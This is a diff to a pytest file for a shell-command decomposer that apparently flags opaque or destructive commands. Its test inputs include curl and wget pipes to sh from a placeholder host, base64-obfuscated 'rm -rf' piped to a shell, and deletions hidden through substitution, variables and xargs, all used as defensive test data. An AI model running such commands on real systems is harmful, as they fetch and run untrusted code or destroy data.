@@ -90,13 +90,13 @@ def test_command_substitution_and_backticks():
     assert av[-1][0] == "echo"
 
 
-def test_substitution_as_command_name_is_opaque():
-    s = [s for s in decompose("$(echo rm) -rf x", CWD, HOME) if s.argv and s.argv[0] != "echo"][0]
+def test_nontrivial_substitution_as_command_name_is_opaque():
+    s = [s for s in decompose("$(cat cmd.txt) -rf x", CWD, HOME) if s.argv and s.argv[0] != "cat"][0]
     assert s.opaque
 
 
-def test_variable_command_name_is_opaque():
-    segs = decompose("c=rm; $c -rf x", CWD, HOME)
+def test_unknown_variable_command_name_is_opaque():
+    segs = decompose("$c -rf x", CWD, HOME)
     assert any(s.opaque for s in segs)
 
 
@@ -192,7 +192,7 @@ def test_interpreter_guess_paths():
 
 
 @pytest.mark.parametrize("cmd", ["curl -s http://x | sh", "wget -qO- http://x | bash",
-                                 "echo cm0gLXJmIC8= | base64 -d | sh", "base64 -d payload | bash -s"])
+                                 "cat payload.b64 | base64 -d | sh", "base64 -d payload | bash -s"])
 def test_piped_shell_is_opaque(cmd):
     s = decompose(cmd, CWD, HOME)[-1]
     assert s.opaque and "delete" in s.guess
@@ -223,3 +223,51 @@ def test_cd_updates_cwd_for_later_segments():
 def test_empty_and_whitespace():
     assert decompose("", CWD, HOME) == []
     assert decompose("   \n  ", CWD, HOME) == []
+
+
+# --- static resolution of common indirections -------------------------------------------------
+
+def test_echo_substitution_resolved():
+    for cmd in ["$(echo rm) -rf build", "`echo rm` -rf build", "$(printf rm) -rf build"]:
+        s = [s for s in decompose(cmd, CWD, HOME) if s.cmd not in ("echo", "printf")][0]
+        assert s.argv == ["rm", "-rf", "build"] and not s.opaque, cmd
+
+
+def test_variable_command_tracked_across_segments():
+    segs = decompose("cmd='rm -rf build'; $cmd", CWD, HOME)
+    assert ["rm", "-rf", "build"] in [s.argv for s in segs]
+    assert not any(s.opaque for s in segs)
+    segs = decompose("c=rm; ${c} -rf build", CWD, HOME)
+    assert ["rm", "-rf", "build"] in [s.argv for s in segs]
+    # unknown variable stays opaque
+    assert any(s.opaque for s in decompose("$nope -rf build", CWD, HOME))
+
+
+def test_xargs_with_known_stdin():
+    s = decompose("echo tests/test_a.py | xargs rm", CWD, HOME)[-1]
+    assert s.argv == ["rm", "tests/test_a.py"] and not s.unknown_args
+    s = decompose("xargs rm -rf <<< build", CWD, HOME)[-1]
+    assert s.argv == ["rm", "-rf", "build"]
+    s = decompose("printf 'a\\nb' | xargs -n1 rm", CWD, HOME)[-1]
+    assert s.argv[:1] == ["rm"] and "a" in s.argv and "b" in s.argv
+
+
+def test_xargs_I_placeholder_collapses_to_dir():
+    s = decompose("ls tests | xargs -I{} rm tests/{}", CWD, HOME)[-1]
+    assert s.argv == ["rm", "tests"] and s.unknown_args
+
+
+def test_base64_literal_decoded():
+    # cm0gLXJmIGJ1aWxk == "rm -rf build"
+    for cmd in ["base64 -d <<< cm0gLXJmIGJ1aWxk | sh", "echo cm0gLXJmIGJ1aWxk | base64 -d | bash",
+                "echo cm0gLXJmIGJ1aWxk | base64 --decode | sh -s"]:
+        segs = decompose(cmd, CWD, HOME)
+        assert ["rm", "-rf", "build"] in [s.argv for s in segs], cmd
+        assert not any(s.opaque for s in segs), cmd
+    # base64 from a file stays opaque
+    assert any(s.opaque for s in decompose("base64 -d payload | sh", CWD, HOME))
+
+
+def test_perl_unlink_path_without_parens():
+    s = first("perl -e 'unlink \"tests/test_a.py\"'")
+    assert "/proj/tests/test_a.py" in s.guess_paths
